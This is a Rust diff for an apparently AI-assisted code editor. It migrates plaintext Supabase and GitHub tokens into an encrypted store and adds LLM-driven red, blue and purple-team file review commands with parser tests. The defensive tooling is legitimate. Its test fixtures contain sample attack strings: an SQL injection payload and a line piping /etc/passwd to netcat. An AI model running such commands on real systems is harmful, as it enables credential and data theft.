+    store: &vibecli_cli::workspace_store::WorkspaceStore,
+    workspace: &std::path::Path,
+) -> Option<SupabaseConfig> {
+    let path = supabase_legacy_path(workspace);
+    let text = std::fs::read_to_string(&path).ok()?;
+    let cfg: SupabaseConfig = serde_json::from_str(&text).ok()?;
+    let stored = store
+        .setting_set(SUPABASE_URL_KEY, &cfg.url)
+        .and_then(|()| {
+            store
+                .secret_set(SUPABASE_ANON_KEY, &cfg.anon_key, Some("migration"))
+                .map(|_| ())
+        })
+        .is_ok();
+    if stored {
+        let _ = std::fs::remove_file(&path);
+    }
+    Some(cfg)
+}
+
 #[tauri::command]
 pub async fn get_supabase_config(workspace_path: String) -> Result<SupabaseConfig, String> {
     let workspace = reject_sensitive_path(&workspace_path)?;
-    let path = workspace.join(".vibecoder").join("supabase.json");
-    if path.exists() {
-        let text = std::fs::read_to_string(&path).map_err(|e| e.to_string())?;
-        serde_json::from_str(&text).map_err(|e| e.to_string())
-    } else {
-        Ok(SupabaseConfig::default())
+    let store = vibecli_cli::workspace_store::WorkspaceStore::open(&workspace)?;
+    if let Some(cfg) = migrate_supabase_config(&store, &workspace) {
+        return Ok(cfg);
     }
+    Ok(SupabaseConfig {
+        url: store.setting_get(SUPABASE_URL_KEY)?.unwrap_or_default(),
+        anon_key: store.secret_get(SUPABASE_ANON_KEY)?.unwrap_or_default(),
+    })
 }
 
 #[tauri::command]
@@ -15815,11 +16295,13 @@ pub async fn save_supabase_config(
     anon_key: String,
 ) -> Result<(), String> {
     let workspace = reject_sensitive_path(&workspace_path)?;
-    let dir = workspace.join(".vibecoder");
-    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
-    let cfg = SupabaseConfig { url, anon_key };
-    let json = serde_json::to_string_pretty(&cfg).map_err(|e| e.to_string())?;
-    std::fs::write(dir.join("supabase.json"), json).map_err(|e| e.to_string())
+    let store = vibecli_cli::workspace_store::WorkspaceStore::open(&workspace)?;
+    store.setting_set(SUPABASE_URL_KEY, &url)?;
+    store.secret_set(SUPABASE_ANON_KEY, &anon_key, Some("settings"))?;
+    // A stale plaintext copy would be migrated back over this one on the next
+    // read, and is a secret in the checkout either way.
+    let _ = std::fs::remove_file(supabase_legacy_path(&workspace));
+    Ok(())
 }
 
 /// List Supabase tables via the PostgREST introspection endpoint.
@@ -16146,31 +16628,51 @@ pub struct GitHubSyncStatus {
     pub last_synced: Option<String>,
 }
 
+/// Where Settings → Integrations → Infrastructure stores the GitHub token.
+const GITHUB_TOKEN_KEY: &str = "integration.infra.github_token";
+
+/// The GitHub access token.
+///
+/// Resolution is [`vibecli_cli::github_app::resolve_github_token`] — the same
+/// one the daemon, bugbot and the vulnerability scanner use, so a token typed
+/// into Settings is the token all of them see. What this adds is the migration
+/// of a legacy plaintext `<workspace>/.vibecoder/github_token`, which ran once
+/// per read and is what the resolver must never have to know about.
+///
+/// There is no write path here — Settings owns the field.
 fn load_github_token(workspace_path: &str) -> Option<String> {
-    // Check env first, then workspace .vibecoder/github_token
-    if let Ok(t) = std::env::var("GITHUB_TOKEN") {
-        return Some(t);
-    }
+    // Before resolving: a token still sitting in the legacy file has to reach
+    // the store first, or the resolver would report none and the user would be
+    // asked to paste a token they already gave us.
+    let migrated = migrate_legacy_github_token(workspace_path);
+    vibecli_cli::github_app::resolve_github_token().or(migrated)
+}
+
+/// Move a pre-Settings plaintext token into the encrypted store. The file is
+/// deleted only once the encrypted copy is written — on a store failure it is
+/// still the user's only copy.
+fn migrate_legacy_github_token(workspace_path: &str) -> Option<String> {
     let path = std::path::PathBuf::from(workspace_path)
         .join(".vibecoder")
         .join("github_token");
-    std::fs::read_to_string(path)
-        .ok()
-        .map(|s| s.trim().to_string())
+    let token = std::fs::read_to_string(&path).ok()?.trim().to_string();
+    if token.is_empty() {
+        let _ = std::fs::remove_file(&path);
+        return None;
+    }
+    let migrated = PanelStore::new()
+        .and_then(|store| store.set_api_key("default", GITHUB_TOKEN_KEY, &token))
+        .is_ok();
+    if migrated {
+        let _ = std::fs::remove_file(&path);
+    }
+    Some(token)
 }
 
 #[tauri::command]
 pub async fn has_github_token(workspace_path: String) -> Result<bool, String> {
     let _ = reject_sensitive_path(&workspace_path)?;
     Ok(load_github_token(&workspace_path).is_some())
-}
-
-#[tauri::command]
-pub async fn save_github_token(workspace_path: String, token: String) -> Result<(), String> {
-    let workspace = reject_sensitive_path(&workspace_path)?;
-    let dir = workspace.join(".vibecoder");
-    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
-    std::fs::write(dir.join("github_token"), token.trim()).map_err(|e| e.to_string())
 }
 
 /// Whether the open workspace is under version control, and whether we should
@@ -16318,7 +16820,8 @@ pub struct RepoInfo {
 #[tauri::command]
 pub async fn list_github_repos(workspace_path: String) -> Result<Vec<RepoInfo>, String> {
     let _ = reject_sensitive_path(&workspace_path)?;
-    let token = load_github_token(&workspace_path).ok_or("GITHUB_TOKEN not set")?;
+    let token = load_github_token(&workspace_path)
+        .ok_or("No GitHub token — add one in Settings → Integrations → Infrastructure")?;
     let client = reqwest::Client::new();
     let resp = client
         .get("https://api.github.com/user/repos?per_page=50&sort=updated")
@@ -16359,7 +16862,8 @@ pub async fn github_create_repo(
     #[allow(non_snake_case)] private: bool,
 ) -> Result<String, String> {
     let _ = reject_sensitive_path(&workspace_path)?;
-    let token = load_github_token(&workspace_path).ok_or("GITHUB_TOKEN not set")?;
+    let token = load_github_token(&workspace_path)
+        .ok_or("No GitHub token — add one in Settings → Integrations → Infrastructure")?;
     let client = reqwest::Client::new();
     let body = serde_json::json!({ "name": name, "private": private, "auto_init": false });
     let resp = client
@@ -17302,6 +17806,549 @@ pub async fn cancel_redteam_scan(session_id: String) -> Result<(), String> {
         std::fs::write(&path, &updated).map_err(|e| e.to_string())?;
     }
     Ok(())
+}
+
+// ── Workspace Red Team — adversarial review of code and content ───────────────
+//
+// The staged pipeline above targets a running URL. This targets the files in
+// the workspace: the same file-walk + one-LLM-call-per-file loop the security
+// review uses, but with an *attacker's* prompt and a wider net.
+//
+// Two things make it red-teaming rather than the security review next to it:
+//   1. The prompt asks the model to think as an operator — what it would chain,
+//      abuse, or exfiltrate — not to enumerate CWEs defensively.
+//   2. It reads *content*, not only code. A system prompt, an agent instruction
+//      file, a doc that feeds a RAG index, a template — these are the injection
+//      and jailbreak surface, and the security review skips them by design.
+//
+// Provider-agnostic: the caller passes the toolbar's provider+model, exactly
+// like `security_review_file`. No default to Anthropic.
+
+/// Directories a workspace red-team never descends into — build output and
+/// vendored code, whose findings are not the user's to fix. Same list the
+/// security review uses; kept separate so the two can diverge without surprise.
+const REDTEAM_SKIP_DIRS: &[&str] = &[
+    "node_modules",
+    ".git",
+    "target",
+    "dist",
+    "build",
+    ".next",
+    "vendor",
+    "__pycache__",
+    ".venv",
+    "venv",
+    ".gradle",
+    "out",
+    ".cache",
+];
+
+/// Largest file a red-team pass reads. The whole file goes in the prompt, so a
+/// bigger one would be silently reviewed only to its midpoint.
+const REDTEAM_MAX_BYTES: u64 = 400_000;
+
+/// Default and hard ceilings on files per run. One LLM call each, so an
+/// unbounded sweep is an unbounded bill — the panel shows when the cap bit.
+const REDTEAM_DEFAULT_LIMIT: usize = 40;
+const REDTEAM_MAX_LIMIT: usize = 400;
+
+/// File extensions worth red-teaming.
+///
+/// A superset of the security review's code-only net: it adds the *content*
+/// surface — Markdown, text, prompt and template files, HTML, notebooks — where
+/// prompt-injection and jailbreak payloads live. Binaries, images, lockfiles
+/// and minified bundles are excluded: nothing to attack and a call wasted.
+fn is_redteam_target(ext: &str) -> bool {
+    // Content that is itself an attack surface for an LLM-driven product.
+    const CONTENT: &[&str] = &[
+        "md", "mdx", "markdown", "txt", "rst", "adoc", "org", "prompt", "tmpl",
+        "hbs", "mustache", "jinja", "j2", "html", "htm", "ipynb",
+    ];
+    if CONTENT.contains(&ext) {
+        return true;
+    }
+    // Otherwise: anything the app recognises as a programming language, minus
+    // the ones a red-team read yields nothing from.
+    !matches!(ext_to_language(ext), None | Some("CSS"))
+}
+
+/// The files a workspace review will read. Same shape and scope rules as
+/// [`SecurityReviewTargets`]/`security_review_targets`; the filter is
+/// [`is_redteam_target`] instead, so content files are included.
+///
+/// Shared by all three workspace reviews — red (attack), blue (defense), purple
+/// (coverage) — which differ only in the prompt, never in which files to read.
+#[derive(Debug, serde::Serialize)]
+pub struct RedTeamTargets {
+    pub files: Vec<String>,
+    /// How many matched before the cap. `matched > files.len()` means the run
+    /// does not cover the workspace, and the panel says so rather than implying
+    /// a clean sweep.
+    pub matched: usize,
+    pub limit: usize,
+}
+
+/// Resolve a workspace review's scope to a concrete file list.
+///
+/// `pattern` behaves exactly as in the security review: empty = whole
+/// workspace, a real file = that file, a real directory = its subtree, anything
+/// else = a glob over workspace-relative paths. One implementation so red, blue
+/// and purple cannot disagree about what "the workspace" means.
+fn resolve_workspace_targets(
+    workspace: &str,
+    pattern: Option<String>,
+    limit: Option<usize>,
+) -> Result<RedTeamTargets, String> {
+    let root = reject_sensitive_path(workspace)?;
+    let limit = limit
+        .unwrap_or(REDTEAM_DEFAULT_LIMIT)
+        .clamp(1, REDTEAM_MAX_LIMIT);
+    let pattern = pattern.unwrap_or_default().trim().to_string();
+
+    let (scope_root, glob) = match pattern.as_str() {
+        "" => (root.clone(), None),
+        p => {
+            let candidate = root.join(p.trim_start_matches("./"));
+            if candidate.is_file() {
+                let rel = relative_to(&root, &candidate);
+                return Ok(RedTeamTargets {
+                    files: rel.into_iter().collect(),
+                    matched: 1,
+                    limit,
+                });
+            } else if candidate.is_dir() {
+                (candidate, None)
+            } else {
+                (root.clone(), Some(p.trim_start_matches("./").to_string()))
+            }
+        }
+    };
+
+    let mut files: Vec<String> = walkdir::WalkDir::new(&scope_root)
+        .follow_links(false)
+        .max_depth(12)
+        .into_iter()
+        .filter_map(Result::ok)
+        .filter(|entry| entry.file_type().is_file())
+        .filter(|entry| {
+            !entry.path().ancestors().any(|a| {
+                a.file_name()
+                    .and_then(|n| n.to_str())
+                    .is_some_and(|n| REDTEAM_SKIP_DIRS.contains(&n))
+            })
+        })
+        .filter(|entry| {
+            entry
+                .path()
+                .extension()
+                .and_then(|e| e.to_str())
+                .map(str::to_lowercase)
+                .is_some_and(|ext| is_redteam_target(&ext))
+        })
+        .filter(|entry| {
+            entry
+                .metadata()
+                .is_ok_and(|m| m.len() > 0 && m.len() <= REDTEAM_MAX_BYTES)
+        })
+        .filter_map(|entry| relative_to(&root, entry.path()))
+        .filter(|rel| match &glob {
+            Some(pattern) => vibecli_cli::mcp_lazy::glob_match(pattern, rel),
+            None => true,
+        })
+        .collect();
+
+    files.sort();
+    let matched = files.len();
+    files.truncate(limit);
+
+    Ok(RedTeamTargets {
+        files,
+        matched,
+        limit,
+    })
+}
+
+/// Files in scope for a red-team (attacker) workspace review.
+#[tauri::command]
+pub async fn redteam_workspace_targets(
+    workspace: String,
+    pattern: Option<String>,
+    limit: Option<usize>,
+) -> Result<RedTeamTargets, String> {
+    resolve_workspace_targets(&workspace, pattern, limit)
+}
+
+/// Files in scope for a blue-team (defender) workspace review. Same file net —
+/// the defender reviews the same code and content the attacker would.
+#[tauri::command]
+pub async fn blueteam_workspace_targets(
+    workspace: String,
+    pattern: Option<String>,
+    limit: Option<usize>,
+) -> Result<RedTeamTargets, String> {
+    resolve_workspace_targets(&workspace, pattern, limit)
+}
+
+/// Files in scope for a purple-team (coverage) workspace review.
+#[tauri::command]
+pub async fn purpleteam_workspace_targets(
+    workspace: String,
+    pattern: Option<String>,
+    limit: Option<usize>,
+) -> Result<RedTeamTargets, String> {
+    resolve_workspace_targets(&workspace, pattern, limit)
+}
+
+/// Build the adversarial prompt for one workspace file.
+///
+/// Deliberately unlike [`build_review_prompt`]: the frame is an operator, not an
+/// auditor, and the output carries an attack vector, a proof-of-concept and a
+/// remediation — the three things a red-team finding is judged on.
+fn build_redteam_prompt(file: &str, contents: &str) -> String {
+    format!(
+        "You are a red-team operator reviewing ONE file from a software project. \
+         Think like an attacker: given only this file, what could you actually \
+         abuse? Consider, as they apply to what this file is:\n\
+         - code: injection, auth/authz bypass, SSRF, path traversal, unsafe \
+           deserialization, secret leakage, race conditions, unsafe defaults;\n\
+         - content/prompts/docs (Markdown, templates, agent instructions, RAG \
+           sources): prompt injection, jailbreak framing, data-exfiltration \
+           instructions, tool-abuse or over-broad permissions granted in text, \
+           misleading or dangerous guidance a model would follow.\n\n\
+         Report ONLY plausible, concrete attacks — no generic hardening advice, \
+         no style. Prefer a real attack chain over a checklist item.\n\n\
+         Return ONE finding per line, EXACTLY:\n\
+         SEVERITY|LINE|VECTOR|TITLE|DESCRIPTION|POC|REMEDIATION\n\
+         - SEVERITY: one of info|low|medium|high|critical (attacker impact)\n\
+         - LINE: 1-based line the issue anchors to, or 0 if none\n\
+         - VECTOR: short attack class (e.g. \"SQL injection\", \"prompt \
+           injection\", \"SSRF\")\n\
+         - TITLE: a few words naming the specific issue\n\
+         - DESCRIPTION: how the attack works here\n\
+         - POC: a concrete payload, request, or input that triggers it\n\
+         - REMEDIATION: the fix\n\
+         Use '\\' before any literal '|' inside a field. If there are no genuine \
+         attacks, output the single line: NONE\n\n\
+         File: {file}\n```\n{contents}\n```"
+    )
+}
+
+/// CVSS-style band midpoint for a severity word, for sorting only.
+///
+/// The model judges *severity*, not a CVSS vector, so a per-finding CVSS would
+/// be a number nobody computed. Findings from this path carry no CVSS
+/// (`cvss_score = 0.0`, which the panel renders as absent); this exists only so
+/// the list can rank a critical above an info.
+fn redteam_severity_rank(sev: &str) -> f64 {
+    match sev.trim().to_lowercase().as_str() {
+        "critical" | "crit" => 4.0,
+        "high" => 3.0,
+        "medium" | "moderate" | "warning" | "warn" => 2.0,
+        "low" | "minor" => 1.0,
+        _ => 0.0,
+    }
+}
+
+/// Split one `SEVERITY|LINE|VECTOR|TITLE|DESCRIPTION|POC|REMEDIATION` line,
+/// honouring `\|` as an escaped literal pipe inside a field.
+fn split_escaped_pipes(line: &str) -> Vec<String> {
+    let mut fields = Vec::new();
+    let mut cur = String::new();
+    let mut chars = line.chars().peekable();
+    while let Some(c) = chars.next() {
+        match c {
+            '\\' if chars.peek() == Some(&'|') => {
+                cur.push('|');
+                chars.next();
+            }
+            '|' => {
+                fields.push(std::mem::take(&mut cur));
+            }
+            _ => cur.push(c),
+        }
+    }
+    fields.push(cur);
+    fields
+}
+
+/// Parse the model's reply into [`RedTeamFinding`]s for one file.
+///
+/// Malformed rows are skipped rather than surfaced as noise; a `NONE` sentinel
+/// yields nothing. `source_file` is always set to the file that was read, so a
+/// finding whose fix needs the path never loses it — the same lesson the
+/// security review's parser encodes.
+fn parse_redteam_findings(file: &str, output: &str) -> Vec<RedTeamFinding> {
+    let mut findings = Vec::new();
+    for raw in output.lines() {
+        let line = raw.trim();
+        if line.is_empty() || line.eq_ignore_ascii_case("none") {
+            continue;
+        }
+        let parts = split_escaped_pipes(line);
+        // SEVERITY|LINE|VECTOR|TITLE|DESCRIPTION at minimum; POC/REMEDIATION optional.
+        if parts.len() < 5 {
+            continue;
+        }
+        let severity = match parts[0].trim().to_lowercase().as_str() {
+            "info" | "informational" => "info",
+            "low" | "minor" => "low",
+            "medium" | "moderate" | "warning" | "warn" => "medium",
+            "high" => "high",
+            "critical" | "crit" => "critical",
+            _ => continue,
+        }
+        .to_string();
+        let line_no: u32 = parts[1].trim().parse().unwrap_or(0);
+        let vector = parts[2].trim().to_string();
+        let title = parts[3].trim().to_string();
+        let description = parts[4].trim().to_string();
+        if title.is_empty() && description.is_empty() {
+            continue;
+        }
+        let poc = parts.get(5).map(|s| s.trim().to_string()).unwrap_or_default();
+        let remediation = parts.get(6).map(|s| s.trim().to_string()).unwrap_or_default();
+
+        findings.push(RedTeamFinding {
+            id: format!("{}-{}", file, findings.len()),
+            attack_vector: vector,
+            // No CVSS was computed — see `redteam_severity_rank`. Kept 0.0 so
+            // the panel shows the severity, not a fabricated score.
+            cvss_score: 0.0,
+            severity,
+            url: String::new(),
+            location: if line_no > 0 {
+                format!("{}:{}", file, line_no)
+            } else {
+                file.to_string()
+            },
+            title: if title.is_empty() {
+                description.clone()
+            } else {
+                title
+            },
+            description,
+            poc,
+            remediation,
+            source_file: Some(file.to_string()),
+            source_line: (line_no > 0).then_some(line_no),
+            // A static read cannot *confirm* exploitation — that would need the
+            // Exploitation/Validation stages the URL flow claims. Honest: false.
+            confirmed: false,
+        });
+    }
+    // Highest attacker impact first.
+    findings.sort_by(|a, b| {
+        redteam_severity_rank(&b.severity)
+            .partial_cmp(&redteam_severity_rank(&a.severity))
+            .unwrap_or(std::cmp::Ordering::Equal)
+    });
+    findings
+}
+
+/// Red-team one workspace file with the toolbar's provider+model.
+///
+/// One LLM call, provider-agnostic. The caller drives the per-file loop so it
+/// can show progress, keep partial findings, and stop — the same division of
+/// labour as `security_review_file`.
+#[tauri::command]
+pub async fn redteam_file(
+    provider: String,
+    model: String,
+    file: String,
+    contents: String,
+    effort: Option<String>,
+) -> Result<Vec<RedTeamFinding>, String> {
+    use vibe_ai::provider::{Message, MessageRole};
+    if provider.trim().is_empty() || model.trim().is_empty() {
+        return Err("Select a provider and model in the toolbar first".to_string());
+    }
+    let prompt = build_redteam_prompt(&file, &contents);
+    let provider_inst = build_temp_provider_with_effort(&provider, &model, effort.as_deref())
+        .ok_or_else(|| format!("Provider '{provider}' is not configured"))?;
+    let reply = provider_inst
+        .chat(
+            &[Message {
+                role: MessageRole::User,
+                content: prompt,
+            }],
+            None,
+        )
+        .await
+        .map_err(|e| e.to_string())?;
+    Ok(parse_redteam_findings(&file, &reply))
+}
+
+/// Persist a completed red-team session (with its findings) so it appears in
+/// Previous Sessions and `generate_redteam_report` can export it.
+///
+/// The URL flow's `start_redteam_scan` writes only a placeholder; the workspace
+/// flow collects findings client-side and saves the whole session at the end.
+#[tauri::command]
+pub async fn redteam_save_session(session: RedTeamSessionInfo) -> Result<(), String> {
+    save_workspace_session("redteam", &session)
+}
+
+/// Persist a completed workspace-review session under `~/.vibecoder/<kind>/`.
+/// Shared by red, blue and purple so history storage cannot diverge.
+fn save_workspace_session(kind: &str, session: &RedTeamSessionInfo) -> Result<(), String> {
+    let home = std::env::var("HOME").unwrap_or_else(|_| ".".to_string());
+    let dir = std::path::PathBuf::from(&home).join(".vibecoder").join(kind);
+    std::fs::create_dir_all(&dir).map_err(|e| e.to_string())?;
+    let path = dir.join(format!("{}.json", session.id));
+    let json = serde_json::to_string_pretty(session).map_err(|e| e.to_string())?;
+    std::fs::write(&path, &json).map_err(|e| e.to_string())
+}
+
+// ── Blue Team — defensive review of workspace code and content ─────────────────
+//
+// The defender's complement to the red-team pass. Same files, same per-file
+// loop, same finding shape — but where red asks "how would you break this?",
+// blue asks "what defence is missing, and what would catch it?". The finding's
+// `remediation` carries the control to add or the detection to write; there is
+// no attack `poc`, because the defender is not attacking.
+
+/// Build the defensive-review prompt for one workspace file.
+fn build_blueteam_prompt(file: &str, contents: &str) -> String {
+    format!(
+        "You are a blue-team (defensive security) engineer reviewing ONE file \
+         from a software project. Do NOT hunt for exploits — assess DEFENCE. For \
+         what this file is, find where a defensive control is missing, weak, or \
+         mis-ordered, and what would detect or prevent an attack:\n\
+         - code: missing input validation/sanitisation, absent authz checks, no \
+           rate limiting, secrets in code, missing/again-bypassable auth, errors \
+           that leak internals, unsafe defaults, no audit logging of security \
+           events, missing timeouts;\n\
+         - content/prompts/docs (Markdown, templates, agent instructions, RAG \
+           sources): no guardrails against injection, over-broad tool \
+           permissions granted in text, missing refusal/allow-list guidance, no \
+           provenance or trust boundary stated.\n\n\
+         Report ONLY concrete, actionable defensive gaps — no generic 'add more \
+         security'. Prefer a specific missing control over a platitude.\n\n\
+         Return ONE finding per line, EXACTLY:\n\
+         SEVERITY|LINE|CONTROL|TITLE|GAP|DETECTION|REMEDIATION\n\
+         - SEVERITY: info|low|medium|high|critical (risk if left undefended)\n\
+         - LINE: 1-based line the gap anchors to, or 0\n\
+         - CONTROL: the control area (e.g. \"input validation\", \"audit \
+           logging\", \"authz\", \"prompt guardrail\")\n\
+         - TITLE: a few words naming the specific gap\n\
+         - GAP: what is undefended and why it matters\n\
+         - DETECTION: a concrete way to detect the attack (a log to emit, a \
+           rule/alert to add, a test) — or empty if none applies\n\
+         - REMEDIATION: the control to add\n\
+         Use '\\' before any literal '|' inside a field. If the file's defences \
+         are sound, output the single line: NONE\n\n\
+         File: {file}\n```\n{contents}\n```"
+    )
+}
+
+/// Blue-team one workspace file with the toolbar's provider+model.
+/// Provider-agnostic; the DETECTION column lands in the finding's `poc` field so
+/// the panel can label it "Detection", and REMEDIATION in `remediation`.
+#[tauri::command]
+pub async fn blueteam_file(
+    provider: String,
+    model: String,
+    file: String,
+    contents: String,
+    effort: Option<String>,
+) -> Result<Vec<RedTeamFinding>, String> {
+    use vibe_ai::provider::{Message, MessageRole};
+    if provider.trim().is_empty() || model.trim().is_empty() {
+        return Err("Select a provider and model in the toolbar first".to_string());
+    }
+    let prompt = build_blueteam_prompt(&file, &contents);
+    let provider_inst = build_temp_provider_with_effort(&provider, &model, effort.as_deref())
+        .ok_or_else(|| format!("Provider '{provider}' is not configured"))?;
+    let reply = provider_inst
+        .chat(
+            &[Message {
+                role: MessageRole::User,
+                content: prompt,
+            }],
+            None,
+        )
+        .await
+        .map_err(|e| e.to_string())?;
+    Ok(parse_redteam_findings(&file, &reply))
+}
+
+#[tauri::command]
+pub async fn blueteam_save_session(session: RedTeamSessionInfo) -> Result<(), String> {
+    save_workspace_session("blueteam", &session)
+}
+
+// ── Purple Team — attack + defence coverage over workspace files ───────────────
+//
+// Purple is red and blue held against each other: for each attack a file
+// exposes, does a defence already stop it? The finding names the attack
+// (`description` + `poc`) and the coverage answer (`remediation`), and the
+// severity is the *residual* risk after existing defences.
+
+/// Build the coverage-review prompt for one workspace file.
+fn build_purpleteam_prompt(file: &str, contents: &str) -> String {
+    format!(
+        "You are a purple-team lead reviewing ONE file from a software project. \
+         Purple team pairs attack with defence: for each realistic attack this \
+         file exposes, judge whether an existing control already stops it, and \
+         report the COVERAGE GAP — the residual risk after what is already \
+         there.\n\n\
+         Consider code attacks (injection, authz bypass, SSRF, path traversal, \
+         deserialization, secret leakage) and content attacks (prompt injection, \
+         jailbreak framing, data-exfiltration or over-broad-permission text in \
+         prompts, docs, templates). For each, note the defence you can see in \
+         this file and whether it is sufficient.\n\n\
+         Report ONLY real coverage gaps — an attack with no, or insufficient, \
+         defence. Skip attacks that are already well defended here.\n\n\
+         Return ONE finding per line, EXACTLY:\n\
+         SEVERITY|LINE|ATTACK|TITLE|COVERAGE|POC|RECOMMENDATION\n\
+         - SEVERITY: info|low|medium|high|critical (RESIDUAL risk after existing \
+           defences)\n\
+         - LINE: 1-based line, or 0\n\
+         - ATTACK: the attack class (e.g. \"SQL injection\", \"prompt \
+           injection\")\n\
+         - TITLE: a few words naming the specific gap\n\
+         - COVERAGE: what defence exists here (if any) and why it is \
+           insufficient — this is the purple-team judgement\n\
+         - POC: the attack input/payload that gets through\n\
+         - RECOMMENDATION: the detection or control that would close the gap\n\
+         Use '\\' before any literal '|' inside a field. If every attack this \
+         file exposes is already well defended, output the single line: NONE\n\n\
+         File: {file}\n```\n{contents}\n```"
+    )
+}
+
+/// Purple-team one workspace file with the toolbar's provider+model.
+#[tauri::command]
+pub async fn purpleteam_file(
+    provider: String,
+    model: String,
+    file: String,
+    contents: String,
+    effort: Option<String>,
+) -> Result<Vec<RedTeamFinding>, String> {
+    use vibe_ai::provider::{Message, MessageRole};
+    if provider.trim().is_empty() || model.trim().is_empty() {
+        return Err("Select a provider and model in the toolbar first".to_string());
+    }
+    let prompt = build_purpleteam_prompt(&file, &contents);
+    let provider_inst = build_temp_provider_with_effort(&provider, &model, effort.as_deref())
+        .ok_or_else(|| format!("Provider '{provider}' is not configured"))?;
+    let reply = provider_inst
+        .chat(
+            &[Message {
+                role: MessageRole::User,
+                content: prompt,
+            }],
+            None,
+        )
+        .await
+        .map_err(|e| e.to_string())?;
+    Ok(parse_redteam_findings(&file, &reply))
+}
+
+#[tauri::command]
+pub async fn purpleteam_save_session(session: RedTeamSessionInfo) -> Result<(), String> {
+    save_workspace_session("purpleteam", &session)
 }
 
 // ── Collab (Phase 43) ───────────────────────────────────────────────────────
@@ -65836,4 +66883,99 @@ pub async fn agile_ai_enhance_safe(
     };
     serde_json::from_str::<serde_json::Value>(slice)
         .map_err(|e| format!("The model's JSON did not parse ({e})"))
+}
+
+#[cfg(test)]
+mod redteam_workspace_tests {
+    use super::*;
+
+    #[test]
+    fn content_files_are_targets_so_prompts_and_docs_get_reviewed() {
+        // The whole point of the workspace mode: a system prompt or an agent
+        // instruction file is the injection surface, and the security review
+        // skips Markdown by design.
+        assert!(is_redteam_target("md"));
+        assert!(is_redteam_target("prompt"));
+        assert!(is_redteam_target("jinja"));
+        assert!(is_redteam_target("ipynb"));
+    }
+
+    #[test]
+    fn code_files_are_targets_and_noise_is_not() {
+        assert!(is_redteam_target("rs"));
+        assert!(is_redteam_target("ts"));
+        assert!(is_redteam_target("py"));
+        // Stylesheets and unknown/binary extensions cost a call and yield
+        // nothing to attack.
+        assert!(!is_redteam_target("css"));
+        assert!(!is_redteam_target("png"));
+        assert!(!is_redteam_target("lock"));
+    }
+
+    #[test]
+    fn parses_a_full_finding_row() {
+        let out = "high|42|SQL injection|Unparameterised query|User input is \
+                   concatenated into SQL|' OR 1=1--|Use a parameterised query";
+        let f = parse_redteam_findings("src/db.rs", out);
+        assert_eq!(f.len(), 1);
+        assert_eq!(f[0].severity, "high");
+        assert_eq!(f[0].attack_vector, "SQL injection");
+        assert_eq!(f[0].title, "Unparameterised query");
+        assert_eq!(f[0].poc, "' OR 1=1--");
+        assert_eq!(f[0].source_file.as_deref(), Some("src/db.rs"));
+        assert_eq!(f[0].source_line, Some(42));
+        assert_eq!(f[0].location, "src/db.rs:42");
+    }
+
+    #[test]
+    fn no_cvss_is_fabricated_and_nothing_is_confirmed() {
+        // A static read judges severity, not a CVSS vector, and cannot confirm
+        // exploitation. Both must stay honest — see the parser's comments.
+        let f = parse_redteam_findings("a.rs", "critical|1|RCE|x|desc|poc|fix");
+        assert_eq!(f[0].cvss_score, 0.0);
+        assert!(!f[0].confirmed);
+    }
+
+    #[test]
+    fn none_sentinel_and_blank_lines_yield_nothing() {
+        assert!(parse_redteam_findings("a.rs", "NONE").is_empty());
+        assert!(parse_redteam_findings("a.rs", "\n  \nnone\n").is_empty());
+    }
+
+    #[test]
+    fn malformed_and_unknown_severity_rows_are_skipped_not_surfaced() {
+        // Too few fields, and a severity word that is not one of ours.
+        let out = "high|1|only three fields\nbanana|2|V|T|D\nlow|3|V|Real|desc";
+        let f = parse_redteam_findings("a.rs", out);
+        assert_eq!(f.len(), 1);
+        assert_eq!(f[0].title, "Real");
+    }
+
+    #[test]
+    fn escaped_pipes_survive_inside_a_field() {
+        // A PoC payload legitimately contains '|'; an unescaped split would cut
+        // the finding in half and mangle every field after it.
+        let out = r"medium|5|cmd injection|Shell metachar|desc|cat /etc/passwd \| nc host 1|sanitise";
+        let f = parse_redteam_findings("a.sh", out);
+        assert_eq!(f.len(), 1);
+        assert_eq!(f[0].poc, "cat /etc/passwd | nc host 1");
+        assert_eq!(f[0].remediation, "sanitise");
+    }
+
+    #[test]
+    fn findings_are_ranked_by_attacker_impact() {
+        let out = "low|1|V|Low thing|d\ncritical|2|V|Crit thing|d\nmedium|3|V|Med thing|d";
+        let f = parse_redteam_findings("a.rs", out);
+        assert_eq!(
+            f.iter().map(|x| x.severity.as_str()).collect::<Vec<_>>(),
+            vec!["critical", "medium", "low"],
+        );
+    }
+
+    #[test]
+    fn a_line_of_zero_leaves_the_finding_file_scoped() {
+        let f = parse_redteam_findings("README.md", "high|0|prompt injection|Jailbreak framing|d|p|fix");
+        assert_eq!(f[0].source_line, None);
+        assert_eq!(f[0].location, "README.md");
+    }
 }
